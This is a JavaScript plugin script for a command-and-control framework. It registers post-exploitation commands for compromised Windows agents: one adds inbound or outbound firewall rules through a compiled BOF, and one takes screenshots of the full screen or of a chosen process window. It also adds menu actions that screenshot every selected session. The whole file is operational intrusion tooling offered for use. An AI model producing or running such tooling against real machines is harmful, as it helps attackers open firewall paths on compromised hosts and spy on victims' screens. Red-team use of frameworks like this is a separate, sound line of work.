var metadata = {
    name: "PostEx-BOF",
    description: "BOFs for post exploitation"
};

/// COMMANDS

var _cmd_fw_add = ax.create_command("add", "Add a new inbound or outbound firewall rule using COM", "firewallrule add 80 RuleName in -g Group1 -d TestRule");
_cmd_fw_add.addArgString("port", true);
_cmd_fw_add.addArgString("rulename", true);
_cmd_fw_add.addArgString("direction", "", "in");
_cmd_fw_add.addArgFlagString("-g", "rulegroup", "", "");
_cmd_fw_add.addArgFlagString("-d", "description", "", "");
_cmd_fw_add.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let direction   = parsed_json["direction"];
    let port        = parsed_json["port"];
    let rulename    = parsed_json["rulename"];
    let rulegroup   = parsed_json["rulegroup"];
    let description = parsed_json["description"];

    let bof_params = ax.bof_pack("cstr,wstr,wstr,wstr,wstr", [direction, port, rulename, rulegroup, description]);
    let bof_path = ax.script_dir() + "_bin/addfirewallrule." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Add firewall rule (BOF)");
});
var cmd_fw = ax.create_command("firewallrule", "Managing firewall rules");
cmd_fw.addSubCommands([_cmd_fw_add]);


var cmd_screenshot = ax.create_command("screenshot_bof", "Alternative screenshot capability that does not do fork n run by @codex_tf2", "screenshot -n screen1 -p 812");
cmd_screenshot.addArgFlagString("-n", "note", "Screenshot caption", "ScreenshotBOF");
cmd_screenshot.addArgFlagInt("-p", "pid", "PID of the application whose window screenshot will be taken. If 0, then a full-screen screenshot", 0);
cmd_screenshot.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let note = parsed_json["note"];
    let pid  = parsed_json["pid"];

    let bof_params = ax.bof_pack("cstr,int", [note, pid]);
    let bof_path = ax.script_dir() + "_bin/Screenshot." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Screenshot BOF");
});


var b_group_test = ax.create_commands_group("PostEx-BOF", [cmd_fw, cmd_screenshot]);
ax.register_commands_group(b_group_test, ["beacon", "gopher"], ["windows"], []);

/// MENU

let screen_access_action = menu.create_action("Screenshot", function(agents_id) { agents_id.forEach(id => ax.execute_command(id, "screenshot_bof")) });
menu.add_session_access(screen_access_action, ["beacon"]);
let g_screen_access_action = menu.create_action("Screenshot", function(agents_id) { agents_id.forEach(id => ax.execute_command(id, "screenshot")) });
menu.add_session_access(g_screen_access_action, ["gopher"]);
